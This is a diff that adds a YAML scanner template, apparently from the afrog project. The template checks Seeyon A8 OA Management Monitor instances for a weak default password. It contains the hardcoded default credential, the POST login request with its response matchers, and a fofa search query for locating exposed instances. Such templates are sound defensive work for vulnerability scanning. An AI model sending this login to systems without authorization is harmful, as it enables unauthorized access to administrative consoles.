@@ -1,0 +1,32 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: password=WLCCYBD@SEEYON
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <title>A8 Management Monitor</title>
+          - Connection Pooling
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/seeyon/management/index.jsp'
+id: seeyon-management-weak-login
+info:
+  author: zan8in
+  description: |-
+    Seeyon A8 Management Monitor  Weak Login
+    1.登录页面：/seeyon/management/index.jsp
+    2.默认密码: WLCCYBD@SEEYON
+    fofa: app="致远互联-OA"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: Seeyon A8 Management Monitor Weak Login
+  severity: high
+  tags: seeyon,oa,weak-login,argus-import
